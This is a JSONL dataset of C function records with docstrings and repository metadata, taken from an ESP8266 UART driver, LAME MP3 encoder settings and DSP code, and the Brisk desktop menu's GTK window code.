{"docstring": "/******************************************************************************\n * FunctionName : tx_start_uart_buffer\n * Description  : get data from the tx buffer and fill the uart tx fifo, co-work with the uart fifo empty interrupt\n * Parameters   : uint8 uart_no - uart port num\n * Returns      : NONE\n*******************************************************************************/\n", "func_signal": "void tx_start_uart_buffer(uint8 uart_no)", "code": "{\n    uint8 tx_fifo_len = (READ_PERI_REG(UART_STATUS(uart_no))>>UART_TXFIFO_CNT_S)&UART_TXFIFO_CNT;\n    uint8 fifo_remain = UART_FIFO_LEN - tx_fifo_len ;\n    uint8 len_tmp;\n    uint16 tail_ptx_len,head_ptx_len,data_len;\n    //struct UartBuffer* pTxBuff = *get_buff_prt();\n    \n    if(pTxBuffer){      \n        data_len = (pTxBuffer->UartBuffSize - pTxBuffer->Space);\n        if(data_len > fifo_remain){\n            len_tmp = fifo_remain;\n            tx_fifo_insert( pTxBuffer,len_tmp,uart_no);\n            SET_PERI_REG_MASK(UART_INT_ENA(UART0), UART_TXFIFO_EMPTY_INT_ENA);\n        }else{\n            len_tmp = data_len;\n            tx_fifo_insert( pTxBuffer,len_tmp,uart_no);\n        }\n    }else{\n        DBG1(\"pTxBuff null \\n\\r\");\n    }\n}", "path": "H03-spi_app\\driver\\uart.c", "repo_name": "AngelLiang/ESP8266-Demos", "stars": 215, "license": "mit", "language": "c", "size": 1288}
{"docstring": "/* Decode on the fly. Find the peak sample. If ReplayGain analysis is \n   enabled then perform it on the decoded data. */\n", "func_signal": "int\nlame_set_decode_on_the_fly(lame_global_flags * gfp, int decode_on_the_fly)", "code": "{\n#ifndef DECODE_ON_THE_FLY\n    return -1;\n#else\n    /* default = 0 (disabled) */\n\n    /* enforce disable/enable meaning, if we need more than two values\n       we need to switch to an enum to have an apropriate representation\n       of the possible meanings of the value */\n    if (0 > decode_on_the_fly || 1 < decode_on_the_fly)\n        return -1;\n\n    gfp->decode_on_the_fly = decode_on_the_fly;\n\n    return 0;\n#endif\n}", "path": "jni\\lame-3.98.4_libmp3lame\\set_get.c", "repo_name": "yhirano/Mp3VoiceRecorderSampleForAndroid", "stars": 234, "license": "None", "language": "c", "size": 431}
{"docstring": "/* input samplerate */\n", "func_signal": "int\nlame_set_in_samplerate(lame_global_flags * gfp, int in_samplerate)", "code": "{\n    /* input sample rate in Hz,  default = 44100 Hz */\n    gfp->in_samplerate = in_samplerate;\n\n    return 0;\n}", "path": "jni\\lame-3.98.4_libmp3lame\\set_get.c", "repo_name": "yhirano/Mp3VoiceRecorderSampleForAndroid", "stars": 234, "license": "None", "language": "c", "size": 431}
{"docstring": "/* MP3 'private extension' bit. Meaningless. */\n", "func_signal": "int\nlame_set_extension(lame_global_flags * gfp, int extension)", "code": "{\n    /* default = 0 (disabled) */\n\n    /* enforce disable/enable meaning, if we need more than two values\n       we need to switch to an enum to have an apropriate representation\n       of the possible meanings of the value */\n    if (0 > extension || 1 < extension)\n        return -1;\n\n    gfp->extension = extension;\n\n    return 0;\n}", "path": "jni\\lame-3.98.4_libmp3lame\\set_get.c", "repo_name": "yhirano/Mp3VoiceRecorderSampleForAndroid", "stars": 234, "license": "None", "language": "c", "size": 431}
{"docstring": "/*\n * Set one of\n *  - brate\n *  - compression ratio.\n *\n * Default is compression ratio of 11.\n */\n", "func_signal": "int\nlame_set_brate(lame_global_flags * gfp, int brate)", "code": "{\n    gfp->brate = brate;\n\n    if (brate > 320) {\n        gfp->disable_reservoir = 1;\n    }\n\n    return 0;\n}", "path": "jni\\lame-3.98.4_libmp3lame\\set_get.c", "repo_name": "yhirano/Mp3VoiceRecorderSampleForAndroid", "stars": 234, "license": "None", "language": "c", "size": 431}
{"docstring": "/* DEPRECATED. same as lame_set_decode_on_the_fly() &&\n   lame_set_findReplayGain() */\n", "func_signal": "int\nlame_set_ReplayGain_decode(lame_global_flags * gfp, int arg)", "code": "{\n    if (lame_set_decode_on_the_fly(gfp, arg) < 0 || lame_set_findReplayGain(gfp, arg) < 0)\n        return -1;\n    else\n        return 0;\n}", "path": "jni\\lame-3.98.4_libmp3lame\\set_get.c", "repo_name": "yhirano/Mp3VoiceRecorderSampleForAndroid", "stars": 234, "license": "None", "language": "c", "size": 431}
{"docstring": "/* Mark as copyright protected. */\n", "func_signal": "int\nlame_set_copyright(lame_global_flags * gfp, int copyright)", "code": "{\n    /* default = 0 (disabled) */\n\n    /* enforce disable/enable meaning, if we need more than two values\n       we need to switch to an enum to have an apropriate representation\n       of the possible meanings of the value */\n    if (0 > copyright || 1 < copyright)\n        return -1;\n\n    gfp->copyright = copyright;\n\n    return 0;\n}", "path": "jni\\lame-3.98.4_libmp3lame\\set_get.c", "repo_name": "yhirano/Mp3VoiceRecorderSampleForAndroid", "stars": 234, "license": "None", "language": "c", "size": 431}
{"docstring": "/* returns sum_j=0^31 a[j]*cos(PI*j*(k+1/2)/32), 0<=k<32 */\n", "func_signal": "inline static void\nwindow_subband(const sample_t * x1, FLOAT a[SBLIMIT])", "code": "{\n    int     i;\n    FLOAT const *wp = enwindow + 10;\n\n    const sample_t *x2 = &x1[238 - 14 - 286];\n\n    for (i = -15; i < 0; i++) {\n        FLOAT   w, s, t;\n\n        w = wp[-10];\n        s = x2[-224] * w;\n        t = x1[224] * w;\n        w = wp[-9];\n        s += x2[-160] * w;\n        t += x1[160] * w;\n        w = wp[-8];\n        s += x2[-96] * w;\n        t += x1[96] * w;\n        w = wp[-7];\n        s += x2[-32] * w;\n        t += x1[32] * w;\n        w = wp[-6];\n        s += x2[32] * w;\n        t += x1[-32] * w;\n        w = wp[-5];\n        s += x2[96] * w;\n        t += x1[-96] * w;\n        w = wp[-4];\n        s += x2[160] * w;\n        t += x1[-160] * w;\n        w = wp[-3];\n        s += x2[224] * w;\n        t += x1[-224] * w;\n\n        w = wp[-2];\n        s += x1[-256] * w;\n        t -= x2[256] * w;\n        w = wp[-1];\n        s += x1[-192] * w;\n        t -= x2[192] * w;\n        w = wp[0];\n        s += x1[-128] * w;\n        t -= x2[128] * w;\n        w = wp[1];\n        s += x1[-64] * w;\n        t -= x2[64] * w;\n        w = wp[2];\n        s += x1[0] * w;\n        t -= x2[0] * w;\n        w = wp[3];\n        s += x1[64] * w;\n        t -= x2[-64] * w;\n        w = wp[4];\n        s += x1[128] * w;\n        t -= x2[-128] * w;\n        w = wp[5];\n        s += x1[192] * w;\n        t -= x2[-192] * w;\n\n        /*\n         * this multiplyer could be removed, but it needs more 256 FLOAT data.\n         * thinking about the data cache performance, I think we should not\n         * use such a huge table. tt 2000/Oct/25\n         */\n        s *= wp[6];\n        w = t - s;\n        a[30 + i * 2] = t + s;\n        a[31 + i * 2] = wp[7] * w;\n        wp += 18;\n        x1--;\n        x2++;\n    }\n    {\n        FLOAT   s, t, u, v;\n        t = x1[-16] * wp[-10];\n        s = x1[-32] * wp[-2];\n        t += (x1[-48] - x1[16]) * wp[-9];\n        s += x1[-96] * wp[-1];\n        t += (x1[-80] + x1[48]) * wp[-8];\n        s += x1[-160] * wp[0];\n        t += (x1[-112] - x1[80]) * wp[-7];\n        s += x1[-224] * wp[1];\n        t += (x1[-144] + x1[112]) * wp[-6];\n        s -= x1[32] * wp[2];\n        t += (x1[-176] - x1[144]) * wp[-5];\n        s -= x1[96] * wp[3];\n        t += (x1[-208] + x1[176]) * wp[-4];\n        s -= x1[160] * wp[4];\n        t += (x1[-240] - x1[208]) * wp[-3];\n        s -= x1[224];\n\n        u = s - t;\n        v = s + t;\n\n        t = a[14];\n        s = a[15] - t;\n\n        a[31] = v + t;  /* A0 */\n        a[30] = u + s;  /* A1 */\n        a[15] = u - s;  /* A2 */\n        a[14] = v - t;  /* A3 */\n    }\n    {\n        FLOAT   xr;\n        xr = a[28] - a[0];\n        a[0] += a[28];\n        a[28] = xr * wp[-2 * 18 + 7];\n        xr = a[29] - a[1];\n        a[1] += a[29];\n        a[29] = xr * wp[-2 * 18 + 7];\n\n        xr = a[26] - a[2];\n        a[2] += a[26];\n        a[26] = xr * wp[-4 * 18 + 7];\n        xr = a[27] - a[3];\n        a[3] += a[27];\n        a[27] = xr * wp[-4 * 18 + 7];\n\n        xr = a[24] - a[4];\n        a[4] += a[24];\n        a[24] = xr * wp[-6 * 18 + 7];\n        xr = a[25] - a[5];\n        a[5] += a[25];\n        a[25] = xr * wp[-6 * 18 + 7];\n\n        xr = a[22] - a[6];\n        a[6] += a[22];\n        a[22] = xr * SQRT2;\n        xr = a[23] - a[7];\n        a[7] += a[23];\n        a[23] = xr * SQRT2 - a[7];\n        a[7] -= a[6];\n        a[22] -= a[7];\n        a[23] -= a[22];\n\n        xr = a[6];\n        a[6] = a[31] - xr;\n        a[31] = a[31] + xr;\n        xr = a[7];\n        a[7] = a[30] - xr;\n        a[30] = a[30] + xr;\n        xr = a[22];\n        a[22] = a[15] - xr;\n        a[15] = a[15] + xr;\n        xr = a[23];\n        a[23] = a[14] - xr;\n        a[14] = a[14] + xr;\n\n        xr = a[20] - a[8];\n        a[8] += a[20];\n        a[20] = xr * wp[-10 * 18 + 7];\n        xr = a[21] - a[9];\n        a[9] += a[21];\n        a[21] = xr * wp[-10 * 18 + 7];\n\n        xr = a[18] - a[10];\n        a[10] += a[18];\n        a[18] = xr * wp[-12 * 18 + 7];\n        xr = a[19] - a[11];\n        a[11] += a[19];\n        a[19] = xr * wp[-12 * 18 + 7];\n\n        xr = a[16] - a[12];\n        a[12] += a[16];\n        a[16] = xr * wp[-14 * 18 + 7];\n        xr = a[17] - a[13];\n        a[13] += a[17];\n        a[17] = xr * wp[-14 * 18 + 7];\n\n        xr = -a[20] + a[24];\n        a[20] += a[24];\n        a[24] = xr * wp[-12 * 18 + 7];\n        xr = -a[21] + a[25];\n        a[21] += a[25];\n        a[25] = xr * wp[-12 * 18 + 7];\n\n        xr = a[4] - a[8];\n        a[4] += a[8];\n        a[8] = xr * wp[-12 * 18 + 7];\n        xr = a[5] - a[9];\n        a[5] += a[9];\n        a[9] = xr * wp[-12 * 18 + 7];\n\n        xr = a[0] - a[12];\n        a[0] += a[12];\n        a[12] = xr * wp[-4 * 18 + 7];\n        xr = a[1] - a[13];\n        a[1] += a[13];\n        a[13] = xr * wp[-4 * 18 + 7];\n        xr = a[16] - a[28];\n        a[16] += a[28];\n        a[28] = xr * wp[-4 * 18 + 7];\n        xr = -a[17] + a[29];\n        a[17] += a[29];\n        a[29] = xr * wp[-4 * 18 + 7];\n\n        xr = SQRT2 * (a[2] - a[10]);\n        a[2] += a[10];\n        a[10] = xr;\n        xr = SQRT2 * (a[3] - a[11]);\n        a[3] += a[11];\n        a[11] = xr;\n        xr = SQRT2 * (-a[18] + a[26]);\n        a[18] += a[26];\n        a[26] = xr - a[18];\n        xr = SQRT2 * (-a[19] + a[27]);\n        a[19] += a[27];\n        a[27] = xr - a[19];\n\n        xr = a[2];\n        a[19] -= a[3];\n        a[3] -= xr;\n        a[2] = a[31] - xr;\n        a[31] += xr;\n        xr = a[3];\n        a[11] -= a[19];\n        a[18] -= xr;\n        a[3] = a[30] - xr;\n        a[30] += xr;\n        xr = a[18];\n        a[27] -= a[11];\n        a[19] -= xr;\n        a[18] = a[15] - xr;\n        a[15] += xr;\n\n        xr = a[19];\n        a[10] -= xr;\n        a[19] = a[14] - xr;\n        a[14] += xr;\n        xr = a[10];\n        a[11] -= xr;\n        a[10] = a[23] - xr;\n        a[23] += xr;\n        xr = a[11];\n        a[26] -= xr;\n        a[11] = a[22] - xr;\n        a[22] += xr;\n        xr = a[26];\n        a[27] -= xr;\n        a[26] = a[7] - xr;\n        a[7] += xr;\n\n        xr = a[27];\n        a[27] = a[6] - xr;\n        a[6] += xr;\n\n        xr = SQRT2 * (a[0] - a[4]);\n        a[0] += a[4];\n        a[4] = xr;\n        xr = SQRT2 * (a[1] - a[5]);\n        a[1] += a[5];\n        a[5] = xr;\n        xr = SQRT2 * (a[16] - a[20]);\n        a[16] += a[20];\n        a[20] = xr;\n        xr = SQRT2 * (a[17] - a[21]);\n        a[17] += a[21];\n        a[21] = xr;\n\n        xr = -SQRT2 * (a[8] - a[12]);\n        a[8] += a[12];\n        a[12] = xr - a[8];\n        xr = -SQRT2 * (a[9] - a[13]);\n        a[9] += a[13];\n        a[13] = xr - a[9];\n        xr = -SQRT2 * (a[25] - a[29]);\n        a[25] += a[29];\n        a[29] = xr - a[25];\n        xr = -SQRT2 * (a[24] + a[28]);\n        a[24] -= a[28];\n        a[28] = xr - a[24];\n\n        xr = a[24] - a[16];\n        a[24] = xr;\n        xr = a[20] - xr;\n        a[20] = xr;\n        xr = a[28] - xr;\n        a[28] = xr;\n\n        xr = a[25] - a[17];\n        a[25] = xr;\n        xr = a[21] - xr;\n        a[21] = xr;\n        xr = a[29] - xr;\n        a[29] = xr;\n\n        xr = a[17] - a[1];\n        a[17] = xr;\n        xr = a[9] - xr;\n        a[9] = xr;\n        xr = a[25] - xr;\n        a[25] = xr;\n        xr = a[5] - xr;\n        a[5] = xr;\n        xr = a[21] - xr;\n        a[21] = xr;\n        xr = a[13] - xr;\n        a[13] = xr;\n        xr = a[29] - xr;\n        a[29] = xr;\n\n        xr = a[1] - a[0];\n        a[1] = xr;\n        xr = a[16] - xr;\n        a[16] = xr;\n        xr = a[17] - xr;\n        a[17] = xr;\n        xr = a[8] - xr;\n        a[8] = xr;\n        xr = a[9] - xr;\n        a[9] = xr;\n        xr = a[24] - xr;\n        a[24] = xr;\n        xr = a[25] - xr;\n        a[25] = xr;\n        xr = a[4] - xr;\n        a[4] = xr;\n        xr = a[5] - xr;\n        a[5] = xr;\n        xr = a[20] - xr;\n        a[20] = xr;\n        xr = a[21] - xr;\n        a[21] = xr;\n        xr = a[12] - xr;\n        a[12] = xr;\n        xr = a[13] - xr;\n        a[13] = xr;\n        xr = a[28] - xr;\n        a[28] = xr;\n        xr = a[29] - xr;\n        a[29] = xr;\n\n        xr = a[0];\n        a[0] += a[31];\n        a[31] -= xr;\n        xr = a[1];\n        a[1] += a[30];\n        a[30] -= xr;\n        xr = a[16];\n        a[16] += a[15];\n        a[15] -= xr;\n        xr = a[17];\n        a[17] += a[14];\n        a[14] -= xr;\n        xr = a[8];\n        a[8] += a[23];\n        a[23] -= xr;\n        xr = a[9];\n        a[9] += a[22];\n        a[22] -= xr;\n        xr = a[24];\n        a[24] += a[7];\n        a[7] -= xr;\n        xr = a[25];\n        a[25] += a[6];\n        a[6] -= xr;\n        xr = a[4];\n        a[4] += a[27];\n        a[27] -= xr;\n        xr = a[5];\n        a[5] += a[26];\n        a[26] -= xr;\n        xr = a[20];\n        a[20] += a[11];\n        a[11] -= xr;\n        xr = a[21];\n        a[21] += a[10];\n        a[10] -= xr;\n        xr = a[12];\n        a[12] += a[19];\n        a[19] -= xr;\n        xr = a[13];\n        a[13] += a[18];\n        a[18] -= xr;\n        xr = a[28];\n        a[28] += a[3];\n        a[3] -= xr;\n        xr = a[29];\n        a[29] += a[2];\n        a[2] -= xr;\n    }\n\n}", "path": "jni\\lame-3.98.4_libmp3lame\\newmdct.c", "repo_name": "yhirano/Mp3VoiceRecorderSampleForAndroid", "stars": 234, "license": "None", "language": "c", "size": 431}
{"docstring": "/* Lower ATH by this many db. */\n", "func_signal": "int\nlame_set_ATHlower(lame_global_flags * gfp, float ATHlower)", "code": "{\n    gfp->ATHlower = -ATHlower / 10.0;\n    return 0;\n}", "path": "jni\\lame-3.98.4_libmp3lame\\set_get.c", "repo_name": "yhirano/Mp3VoiceRecorderSampleForAndroid", "stars": 234, "license": "None", "language": "c", "size": 431}
{"docstring": "/* collect data for an MP3 frame analzyer */\n", "func_signal": "int\nlame_set_analysis(lame_global_flags * gfp, int analysis)", "code": "{\n    /* default = 0 */\n\n    /* enforce disable/enable meaning, if we need more than two values\n       we need to switch to an enum to have an apropriate representation\n       of the possible meanings of the value */\n    if (0 > analysis || 1 < analysis)\n        return -1;\n\n    gfp->analysis = analysis;\n\n    return 0;\n}", "path": "jni\\lame-3.98.4_libmp3lame\\set_get.c", "repo_name": "yhirano/Mp3VoiceRecorderSampleForAndroid", "stars": 234, "license": "None", "language": "c", "size": 431}
{"docstring": "/* Use pseudo substep shaping method */\n", "func_signal": "int\nlame_set_substep(lame_global_flags * gfp, int method)", "code": "{\n    lame_internal_flags *gfc = gfp->internal_flags;\n    /* default = 0.0 (no substep noise shaping) */\n    if (!(0 <= method && method <= 7))\n        return -1;\n\n    gfc->substep_shaping = method;\n    return 0;\n}", "path": "jni\\lame-3.98.4_libmp3lame\\set_get.c", "repo_name": "yhirano/Mp3VoiceRecorderSampleForAndroid", "stars": 234, "license": "None", "language": "c", "size": 431}
{"docstring": "/* Adjust (in dB) the point below which adaptive ATH level adjustment occurs. */\n", "func_signal": "int\nlame_set_athaa_sensitivity(lame_global_flags * gfp, float athaa_sensitivity)", "code": "{\n    gfp->athaa_sensitivity = athaa_sensitivity;\n\n    return 0;\n}", "path": "jni\\lame-3.98.4_libmp3lame\\set_get.c", "repo_name": "yhirano/Mp3VoiceRecorderSampleForAndroid", "stars": 234, "license": "None", "language": "c", "size": 431}
{"docstring": "/* Select ATH formula. */\n", "func_signal": "int\nlame_set_ATHtype(lame_global_flags * gfp, int ATHtype)", "code": "{\n    /* XXX: ATHtype should be converted to an enum. */\n    gfp->ATHtype = ATHtype;\n\n    return 0;\n}", "path": "jni\\lame-3.98.4_libmp3lame\\set_get.c", "repo_name": "yhirano/Mp3VoiceRecorderSampleForAndroid", "stars": 234, "license": "None", "language": "c", "size": 431}
{"docstring": "/* decode only, use lame/mpglib to convert mp3 to wav */\n", "func_signal": "int\nlame_set_decode_only(lame_global_flags * gfp, int decode_only)", "code": "{\n    /* default = 0 (disabled) */\n\n    /* enforce disable/enable meaning, if we need more than two values\n       we need to switch to an enum to have an apropriate representation\n       of the possible meanings of the value */\n    if (0 > decode_only || 1 < decode_only)\n        return -1;\n\n    gfp->decode_only = decode_only;\n\n    return 0;\n}", "path": "jni\\lame-3.98.4_libmp3lame\\set_get.c", "repo_name": "yhirano/Mp3VoiceRecorderSampleForAndroid", "stars": 234, "license": "None", "language": "c", "size": 431}
{"docstring": "/* scale the channel 1 (right) input by this amount before \n   encoding (not used for decoding) */\n", "func_signal": "int\nlame_set_scale_right(lame_global_flags * gfp, float scale)", "code": "{\n    /* default = 0 */\n    gfp->scale_right = scale;\n\n    return 0;\n}", "path": "jni\\lame-3.98.4_libmp3lame\\set_get.c", "repo_name": "yhirano/Mp3VoiceRecorderSampleForAndroid", "stars": 234, "license": "None", "language": "c", "size": 431}
{"docstring": "/* Types of VBR.  default = vbr_off = CBR */\n", "func_signal": "int\nlame_set_VBR(lame_global_flags * gfp, vbr_mode VBR)", "code": "{\n    int     vbr_q = VBR;\n\n    if (0 > vbr_q || vbr_max_indicator <= vbr_q)\n        return -1;      /* Unknown VBR mode! */\n\n    gfp->VBR = VBR;\n\n    return 0;\n}", "path": "jni\\lame-3.98.4_libmp3lame\\set_get.c", "repo_name": "yhirano/Mp3VoiceRecorderSampleForAndroid", "stars": 234, "license": "None", "language": "c", "size": 431}
{"docstring": "/* Only use ATH for short blocks. */\n", "func_signal": "int\nlame_set_ATHshort(lame_global_flags * gfp, int ATHshort)", "code": "{\n    gfp->ATHshort = ATHshort;\n\n    return 0;\n}", "path": "jni\\lame-3.98.4_libmp3lame\\set_get.c", "repo_name": "yhirano/Mp3VoiceRecorderSampleForAndroid", "stars": 234, "license": "None", "language": "c", "size": 431}
{"docstring": "/* mode = STEREO, JOINT_STEREO, DUAL_CHANNEL (not supported), MONO */\n", "func_signal": "int\nlame_set_mode(lame_global_flags * gfp, MPEG_mode mode)", "code": "{\n    int     mpg_mode = mode;\n\n    /* default: lame chooses based on compression ratio and input channels */\n\n    if (mpg_mode < 0 || MAX_INDICATOR <= mpg_mode)\n        return -1;      /* Unknown MPEG mode! */\n\n    gfp->mode = mode;\n\n    return 0;\n}", "path": "jni\\lame-3.98.4_libmp3lame\\set_get.c", "repo_name": "yhirano/Mp3VoiceRecorderSampleForAndroid", "stars": 234, "license": "None", "language": "c", "size": 431}
{"docstring": "/* Select the loudness approximation used by the ATH adaptive auto-leveling. */\n", "func_signal": "int\nlame_set_athaa_loudapprox(lame_global_flags * gfp, int athaa_loudapprox)", "code": "{\n    (void) athaa_loudapprox;\n    ERRORF(gfp->internal_flags, \"--athaa-loudapprox is obsolete\\n\");\n    return 0;\n}", "path": "jni\\lame-3.98.4_libmp3lame\\set_get.c", "repo_name": "yhirano/Mp3VoiceRecorderSampleForAndroid", "stars": 234, "license": "None", "language": "c", "size": 431}
{"docstring": "/* Select ATH formula 4 shape. */\n", "func_signal": "int\nlame_set_ATHcurve(lame_global_flags * gfp, float ATHcurve)", "code": "{\n    gfp->ATHcurve = ATHcurve;\n\n    return 0;\n}", "path": "jni\\lame-3.98.4_libmp3lame\\set_get.c", "repo_name": "yhirano/Mp3VoiceRecorderSampleForAndroid", "stars": 234, "license": "None", "language": "c", "size": 431}
{"docstring": "/* Us a M/S mode with a switching threshold based on compression ratio */\n/* DEPRECATED */\n", "func_signal": "int\nlame_set_mode_automs(lame_global_flags * gfp, int mode_automs)", "code": "{\n    /* default = 0 (disabled) */\n\n    /* enforce disable/enable meaning, if we need more than two values\n       we need to switch to an enum to have an apropriate representation\n       of the possible meanings of the value */\n    if (0 > mode_automs || 1 < mode_automs)\n        return -1;\n\n    lame_set_mode(gfp, JOINT_STEREO);\n\n    return 0;\n}", "path": "jni\\lame-3.98.4_libmp3lame\\set_get.c", "repo_name": "yhirano/Mp3VoiceRecorderSampleForAndroid", "stars": 234, "license": "None", "language": "c", "size": 431}
{"docstring": "/**\n * brisk_classic_window_class_init:\n *\n * Handle class initialisation\n */\n", "func_signal": "static void brisk_classic_window_class_init(BriskClassicWindowClass *klazz)", "code": "{\n        GObjectClass *obj_class = G_OBJECT_CLASS(klazz);\n        BriskMenuWindowClass *b_class = BRISK_MENU_WINDOW_CLASS(klazz);\n        GtkWidgetClass *wid_class = GTK_WIDGET_CLASS(klazz);\n\n        /* gobject vtable hookup */\n        obj_class->dispose = brisk_classic_window_dispose;\n\n        /* Window vtable hookup */\n        b_class->get_id = brisk_classic_window_get_id;\n        b_class->get_display_name = brisk_classic_window_get_display_name;\n        b_class->update_screen_position = brisk_classic_window_update_screen_position;\n        b_class->update_search = brisk_classic_window_update_search;\n        b_class->add_item = brisk_classic_window_add_item;\n        b_class->add_section = brisk_classic_window_add_section;\n        b_class->invalidate_filter = brisk_classic_window_invalidate_filter;\n        b_class->reset = brisk_classic_window_reset;\n\n        /* widget vtable */\n        wid_class->hide = brisk_classic_window_hide;\n}", "path": "src\\frontend\\classic\\classic-window.c", "repo_name": "solus-project/brisk-menu", "stars": 140, "license": "gpl-2.0", "language": "c", "size": 1332}
{"docstring": "/**\n * brisk_classic_window_add_shortcut\n *\n * If we can create a .desktop launcher for the given name, add a new button to\n * the sidebar as a quick launch facility.\n */\n", "func_signal": "static void brisk_classic_window_add_shortcut(BriskMenuWindow *self, const gchar *id)", "code": "{\n        GDesktopAppInfo *info = NULL;\n        GtkWidget *button = NULL;\n\n        info = g_desktop_app_info_new(id);\n        if (!info) {\n                g_message(\"Not adding missing %s to BriskMenu\", id);\n                return;\n        }\n\n        button = brisk_menu_desktop_button_new(self->launcher, G_APP_INFO(info));\n        gtk_widget_show_all(button);\n        gtk_box_pack_start(GTK_BOX(self->section_box_holder), button, FALSE, FALSE, 1);\n}", "path": "src\\frontend\\classic\\classic-window.c", "repo_name": "solus-project/brisk-menu", "stars": 140, "license": "gpl-2.0", "language": "c", "size": 1332}
{"docstring": "/**\n * Begin a build of the menu structure\n */\n", "func_signal": "static void brisk_classic_window_build_sidebar(BriskMenuWindow *self)", "code": "{\n        GtkWidget *sep = NULL;\n        autofree(gstrv) *shortcuts = NULL;\n\n        brisk_classic_window_set_filters_enabled(BRISK_CLASSIC_WINDOW(self), FALSE);\n\n        /* Special leader to control group association, hidden from view */\n        self->section_box_leader = gtk_radio_button_new(NULL);\n        gtk_box_pack_start(GTK_BOX(self->section_box_holder),\n                           self->section_box_leader,\n                           FALSE,\n                           FALSE,\n                           0);\n        gtk_widget_set_no_show_all(self->section_box_leader, TRUE);\n        gtk_widget_hide(self->section_box_leader);\n\n        /* Separate the things */\n        sep = gtk_separator_new(GTK_ORIENTATION_HORIZONTAL);\n        gtk_box_pack_start(GTK_BOX(self->section_box_holder), sep, FALSE, FALSE, 5);\n        gtk_widget_show_all(sep);\n\n        /* Load the shortcuts up */\n        shortcuts = g_settings_get_strv(self->settings, \"pinned-shortcuts\");\n        if (!shortcuts) {\n                return;\n        }\n\n        /* Add from gsettings */\n        for (guint i = 0; i < g_strv_length(shortcuts); i++) {\n                brisk_classic_window_add_shortcut(self, shortcuts[i]);\n        }\n\n        brisk_classic_window_set_filters_enabled(BRISK_CLASSIC_WINDOW(self), TRUE);\n}", "path": "src\\frontend\\classic\\classic-window.c", "repo_name": "solus-project/brisk-menu", "stars": 140, "license": "gpl-2.0", "language": "c", "size": 1332}
{"docstring": "/**\n * Fired by entering into the category button with a roll over\n */\n", "func_signal": "static gboolean brisk_classic_window_on_enter(BriskMenuWindow *self,\n                                              __brisk_unused__ GdkEventCrossing *event,\n                                              GtkWidget *button)", "code": "{\n        GtkToggleButton *but = GTK_TOGGLE_BUTTON(button);\n\n        /* Whether we're in rollover mode */\n        if (!self->rollover) {\n                return GDK_EVENT_PROPAGATE;\n        }\n\n        if (gtk_toggle_button_get_active(but) || !gtk_widget_get_visible(button)) {\n                return GDK_EVENT_PROPAGATE;\n        }\n\n        /* Force activation through rollover */\n        gtk_toggle_button_set_active(but, TRUE);\n\n        return GDK_EVENT_PROPAGATE;\n}", "path": "src\\frontend\\classic\\classic-window.c", "repo_name": "solus-project/brisk-menu", "stars": 140, "license": "gpl-2.0", "language": "c", "size": 1332}
{"docstring": "/**\n * brisk_classic_window_dispose:\n *\n * Clean up a BriskClassicWindow instance\n */\n", "func_signal": "static void brisk_classic_window_dispose(GObject *obj)", "code": "{\n        BriskClassicWindow *self = BRISK_CLASSIC_WINDOW(obj);\n        GdkScreen *screen = NULL;\n\n        if (self->css) {\n                screen = gtk_widget_get_screen(GTK_WIDGET(self));\n                gtk_style_context_remove_provider_for_screen(screen, GTK_STYLE_PROVIDER(self->css));\n                g_clear_object(&self->css);\n        }\n\n        G_OBJECT_CLASS(brisk_classic_window_parent_class)->dispose(obj);\n}", "path": "src\\frontend\\classic\\classic-window.c", "repo_name": "solus-project/brisk-menu", "stars": 140, "license": "gpl-2.0", "language": "c", "size": 1332}
{"docstring": "/**\n * A backend needs us to purge any data we have for it\n */\n", "func_signal": "static void brisk_classic_window_reset(BriskMenuWindow *self, BriskBackend *backend)", "code": "{\n        GtkWidget *box_target = NULL;\n        GList *kids = NULL, *elem = NULL;\n        const gchar *backend_id = NULL;\n\n        backend_id = brisk_backend_get_id(backend);\n\n        box_target = brisk_menu_window_get_section_box(self, backend);\n        gtk_container_foreach(GTK_CONTAINER(box_target),\n                              (GtkCallback)brisk_menu_window_remove_category,\n                              self);\n\n        /* Manual work for the items */\n        kids = gtk_container_get_children(GTK_CONTAINER(BRISK_CLASSIC_WINDOW(self)->apps));\n        for (elem = kids; elem; elem = elem->next) {\n                GtkWidget *row = elem->data;\n                GtkWidget *child = NULL;\n                BriskItem *item = NULL;\n                const gchar *local_backend_id = NULL;\n                const gchar *local_id = NULL;\n\n                if (!GTK_IS_BIN(GTK_BIN(row))) {\n                        continue;\n                }\n\n                child = gtk_bin_get_child(GTK_BIN(row));\n                if (!BRISK_IS_MENU_ENTRY_BUTTON(child)) {\n                        continue;\n                }\n\n                g_object_get(child, \"item\", &item, NULL);\n                if (!item) {\n                        g_warning(\"missing item for entry in backend '%s'\", backend_id);\n                        continue;\n                }\n\n                local_backend_id = brisk_item_get_backend_id(item);\n                if (!g_str_equal(backend_id, local_backend_id)) {\n                        continue;\n                }\n                local_id = brisk_item_get_id(item);\n                g_hash_table_remove(self->item_store, local_id);\n                gtk_widget_destroy(row);\n        }\n        g_list_free(kids);\n}", "path": "src\\frontend\\classic\\classic-window.c", "repo_name": "solus-project/brisk-menu", "stars": 140, "license": "gpl-2.0", "language": "c", "size": 1332}
{"docstring": "/**\n * Load up the CSS assets\n */\n", "func_signal": "static void brisk_classic_window_load_css(BriskClassicWindow *self)", "code": "{\n        GtkCssProvider *css = NULL;\n        autofree(GFile) *file = NULL;\n        autofree(GError) *err = NULL;\n        GdkScreen *screen = NULL;\n\n        file = g_file_new_for_uri(\"resource://com/solus-project/brisk/menu/classic/styling.css\");\n        if (!file) {\n                return;\n        }\n\n        css = gtk_css_provider_new();\n        self->css = css;\n        screen = gtk_widget_get_screen(GTK_WIDGET(self));\n        gtk_style_context_add_provider_for_screen(screen,\n                                                  GTK_STYLE_PROVIDER(css),\n                                                  GTK_STYLE_PROVIDER_PRIORITY_FALLBACK);\n\n        if (!gtk_css_provider_load_from_file(css, file, &err)) {\n                g_warning(\"Failed to load CSS: %s\\n\", err->message);\n                return;\n        }\n}", "path": "src\\frontend\\classic\\classic-window.c", "repo_name": "solus-project/brisk-menu", "stars": 140, "license": "gpl-2.0", "language": "c", "size": 1332}
